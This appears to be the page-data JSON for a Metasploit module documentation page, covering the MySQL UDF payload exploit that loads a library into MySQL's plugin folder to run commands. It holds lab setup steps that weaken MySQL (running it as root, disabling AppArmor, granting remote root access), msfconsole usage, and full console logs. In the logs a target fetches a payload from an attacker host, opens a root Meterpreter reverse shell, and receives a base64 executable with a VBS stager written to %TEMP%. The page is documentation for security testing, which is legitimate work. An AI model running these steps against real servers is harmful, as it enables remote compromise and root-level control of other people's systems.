{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/mysql/mysql_udf_payload","result":{"data":{"moduleMetadataJson":{"id":"eb6b71d4-5bca-532b-808e-ed212ef7b445","name":"Oracle MySQL UDF Payload Execution","fullname":"exploit/multi/mysql/mysql_udf_payload","description":"This module creates and enables a custom UDF (user defined function) on the\n          target host via the SELECT ... into DUMPFILE method of binary injection. On\n          default Microsoft Windows installations of MySQL (=< 5.5.9), directory write\n          permissions not enforced, and the MySQL service runs as LocalSystem.\n\n          NOTE: This module will leave a payload executable on the target system when the\n          attack is finished, as well as the UDF DLL, and will define or redefine sys_eval()\n          and sys_exec() functions.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/mysql/mysql_udf_payload","documentationSlug":"/modules/documentation/exploit/multi/mysql/mysql_udf_payload"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This vulnerability expoits mysql by adding a .so or .dll file which has a system call in it to the plugins folder.\nThe Windows dll files are provided by <a href=\"https://github.com/stamparm\">@stamparm</a> of the sqlmap project and are\nlocated <a href=\"https://github.com/rapid7/metasploit-framework/files/1879611/mysql_udf_libs.zip\">here</a>.  As noted\nin <a href=\"https://github.com/rapid7/metasploit-framework/issues/9677#issuecomment-378893925\">#9677</a> these are 'de-cloaked' versions,\nwhich may attract AV attention.\nThe file is then loaded by mysql, and arbitrary commands can be run.  There are several caveats for this to\nfunction however, including:</p>\n<ol>\n<li><code class=\"language-text\">secure_file_priv</code>, a mysql setting, must be changed from the default to allow writing\nto mysql's plugins folder</li>\n<li>on Ubuntu, apparmor needs a bunch of exceptions added, or to be disabled.  Equivalents on other linux systems most likely need the same</li>\n<li>the mysql folder must be writable</li>\n</ol>\n<h3 id=\"linux-ubuntu-1604-x64-configuration\" style=\"position:relative;\"><a href=\"#linux-ubuntu-1604-x64-configuration\" aria-label=\"linux ubuntu 1604 x64 configuration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Linux (Ubuntu 16.04 x64) Configuration</h3>\n<p>In this configuration, we'll run mysql as root so we have a priv escalate.</p>\n<ol>\n<li>Edit <code class=\"language-text\">/lib/systemd/system/mysql.service</code> and set <code class=\"language-text\">User=root</code></li>\n<li>Edit <code class=\"language-text\">/etc/mysql/mysql.conf.d/mysqld.cnf</code>.  After the <code class=\"language-text\">[mysqld]</code> section, change <code class=\"language-text\">user=mysql</code> to <code class=\"language-text\">user=root</code> </li>\n<li>Edit <code class=\"language-text\">/etc/mysql/mysql.conf.d/mysqld.cnf</code>.  After the <code class=\"language-text\">[mysqld]</code> section, add <code class=\"language-text\">secure_file_priv=&quot;&quot;</code> </li>\n<li>Disable app-armor for mysql: <code class=\"language-text\">sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld</code></li>\n<li>Restart mysql service: <code class=\"language-text\">sudo systemctl restart mysql.service</code></li>\n</ol>\n<p>If you need to make the root user accessible remotely</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED by &#39;password&#39;;\nFLUSH PRIVILEGES;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>or</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">update user set host=&#39;%&#39; where host=&#39;127.0.0.1&#39;;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h3 id=\"windows-server-2012-x64-configuration\" style=\"position:relative;\"><a href=\"#windows-server-2012-x64-configuration\" aria-label=\"windows server 2012 x64 configuration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows (Server 2012 x64) Configuration</h3>\n<p>One good reference for these instructions is <a href=\"https://github.com/rapid7/metasploit-framework/pull/5334\">PR #5334</a></p>\n<ol>\n<li>Download and install mysql installer</li>\n<li>Install dependencies including, at the time of writing, Visual C++ 2013 Redistributable Package.</li>\n<li>Edit <code class=\"language-text\">C:\\ProgramData\\MySQL\\MySQL Server\\MySQL Server *\\my.ini</code> and change the value of <code class=\"language-text\">secure-file-priv=</code> to <code class=\"language-text\">&quot;&quot;</code></li>\n<li>Make the <code class=\"language-text\">C:\\Program Files\\MySQL\\MySQL Server *\\lib\\plugin</code> folder permissions writable by the MySQL (service) user.</li>\n</ol>\n<p>If you need to make the root user accessible remotely</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED by &#39;password&#39;;\nFLUSH PRIVILEGES;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>or</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">update user set host=&#39;%&#39; where host=&#39;127.0.0.1&#39;;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install MySQL and make it vulnerable as described above</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/mysql/mysql_udf_payload</code></li>\n<li>Do: <code class=\"language-text\">set rhost [ip]</code></li>\n<li>Do: <code class=\"language-text\">set srvhost [ip]</code></li>\n<li>Make sure target and payload are correct</li>\n<li>Set mysql login information</li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>FORCE<em>UDF</em>UPLOAD</strong></p>\n<p>  This option will force the uploading of a UDF dll/so file even if one exists which has a system call already</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ubuntu-1604-with-mysql-5720\" style=\"position:relative;\"><a href=\"#ubuntu-1604-with-mysql-5720\" aria-label=\"ubuntu 1604 with mysql 5720 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 16.04 with MySQL 5.7.20</h3>\n<p>In this case, the service has been configured as noted in the first section of this document, a remotely accessible MySQL running as root.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Processing udf.rc for ERB directives.\nresource (udf.rc)&gt; use exploit/multi/mysql/mysql_udf_payload\nresource (udf.rc)&gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nresource (udf.rc)&gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (udf.rc)&gt; set rhost 2.2.2.2\nrhost =&gt; 2.2.2.2\nresource (udf.rc)&gt; set srvhost 1.1.1.1\nsrvhost =&gt; 1.1.1.1\nresource (udf.rc)&gt; set srvport 64423\nsrvport =&gt; 64423\nresource (udf.rc)&gt; set password wordpress\npassword =&gt; wordpress\nresource (udf.rc)&gt; set target 1\ntarget =&gt; 1\nresource (udf.rc)&gt; set verbose true\nverbose =&gt; true\nmsf exploit(mysql_udf_payload) &gt; exploit\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] 2.2.2.2:3306 - Checking target architecture...\n[*] 2.2.2.2:3306 - Checking for sys_exec()...\n[*] 2.2.2.2:3306 - sys_exec() already available, using that (override with FORCE_UDF_UPLOAD).\n[*] 2.2.2.2:3306 - Using URL: http://1.1.1.1:64423/YMDYyVp1fG\n[*] 2.2.2.2:3306 - Client 2.2.2.2 (Wget/1.17.1 (linux-gnu)) requested /YMDYyVp1fG\n[*] 2.2.2.2:3306 - Sending payload to 2.2.2.2 (Wget/1.17.1 (linux-gnu))\n[*] Transmitting intermediate stager...(106 bytes)\n[*] Sending stage (826872 bytes) to 2.2.2.2\n[*] Meterpreter session 4 opened (1.1.1.1:4444 -&gt; 2.2.2.2:46330) at 2017-10-30 23:22:08 -0400\n[-] 2.2.2.2:3306 - Exploit failed: Rex::StreamClosedError Stream #&lt;Socket:0x00561e7e1758e8&gt; is closed.\n[*] 2.2.2.2:3306 - Server stopped.\n[*] Exploit completed, but no session was created.\nmsf exploit(mysql_udf_payload) &gt; sessions -i 4\n[*] Starting interaction with 4...\n\nmeterpreter &gt; sysinfo\nComputer     : 2.2.2.2\nOS           :  (Linux 4.4.0-98-generic)\nArchitecture : x64\nMeterpreter  : x86/linux\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"windows-server-2012-with-mysql-5720\" style=\"position:relative;\"><a href=\"#windows-server-2012-with-mysql-5720\" aria-label=\"windows server 2012 with mysql 5720 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows Server 2012 with MySQL 5.7.20</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Processing udf.rc for ERB directives.\nresource (udf.rc)&gt; use exploit/multi/mysql/mysql_udf_payload\nresource (udf.rc)&gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nresource (udf.rc)&gt; set srvhost 1.1.1.1\nsrvhost =&gt; 1.1.1.1\nresource (udf.rc)&gt; set srvport 64423\nsrvport =&gt; 64423\nresource (udf.rc)&gt; set verbose true\nverbose =&gt; true\nmsf exploit(mysql_udf_payload) &gt; set target 0\ntarget =&gt; 0\nmsf exploit(mysql_udf_payload) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(mysql_udf_payload) &gt; set rhost 3.3.3.3\nrhost =&gt; 3.3.3.3\nmsf exploit(mysql_udf_payload) &gt; set password mysql\npassword =&gt; mysql\nmsf exploit(mysql_udf_payload) &gt; exploit\n\n[*] Started reverse TCP handler on 1.1.1.1:4444 \n[*] 3.3.3.3:3306 - Checking target architecture...\n[*] 3.3.3.3:3306 - Checking for sys_exec()...\n[*] 3.3.3.3:3306 - Checking target architecture...\n[*] 3.3.3.3:3306 - Checking for MySQL plugin directory...\n[*] 3.3.3.3:3306 - Target arch (win64) and target path both okay.\n[*] 3.3.3.3:3306 - Uploading lib_mysqludf_sys_64.dll library to C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/jfAzUfJP.dll...\n[*] 3.3.3.3:3306 - Checking for sys_exec()...\n[*] 3.3.3.3:3306 - Executing: echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQAyzSjSgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAAB2HwAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;&gt;%TEMP%\\EkEiJ.b64\n[*] 3.3.3.3:3306 - Command Stager progress -   1.47% done (1499/102246 bytes)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>...snip...</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] 3.3.3.3:3306 - Executing: echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;&gt;%TEMP%\\EkEiJ.b64\n[*] 3.3.3.3:3306 - Command Stager progress -  96.76% done (98934/102246 bytes)\n[*] 3.3.3.3:3306 - Executing: echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATkIxMAAAAAA2gMFKAQAAAEM6XGxvY2FsMFxhc2ZccmVsZWFzZVxidWlsZC0yLjIuMTRcc3VwcG9ydFxSZWxlYXNlXGFiLnBkYgA=&gt;&gt;%TEMP%\\EkEiJ.b64 &amp; echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Set file = fs.GetFile(&quot;%TEMP%\\EkEiJ.b64&quot;) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo If file.Size Then &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Set fd = fs.OpenTextFile(&quot;%TEMP%\\EkEiJ.b64&quot;, 1) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo data = fd.ReadAll &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo data = Replace(data, vbCrLf, &quot;&quot;) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo data = base64_decode(data) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo fd.Close &gt;&gt;%TEMP%\\GTKoi.vbs\n[*] 3.3.3.3:3306 - Command Stager progress -  98.19% done (100400/102246 bytes)\n[*] 3.3.3.3:3306 - Executing: echo Set ofs = CreateObject(&quot;Scripting.FileSystemObject&quot;).OpenTextFile(&quot;%TEMP%\\CVVsw.exe&quot;, 2, True) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo ofs.Write data &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo ofs.close &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Set shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo shell.run &quot;%TEMP%\\CVVsw.exe&quot;, 0, false &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Else &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Wscript.Echo &quot;The file is empty.&quot; &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo End If &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Function base64_decode(byVal strIn) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Dim w1, w2, w3, w4, n, strOut &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo For n = 1 To Len(strIn) Step 4 &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo w1 = mimedecode(Mid(strIn, n, 1)) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo w2 = mimedecode(Mid(strIn, n + 1, 1)) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo w3 = mimedecode(Mid(strIn, n + 2, 1)) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo w4 = mimedecode(Mid(strIn, n + 3, 1)) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo If Not w2 Then _ &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255)) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo If  Not w3 Then _ &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255)) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo If Not w4 Then _ &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo strOut = strOut + Chr(((w3 * 64 + w4) And 255)) &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo Next &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo base64_decode = strOut &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo End Function &gt;&gt;%TEMP%\\GTKoi.vbs &amp; echo 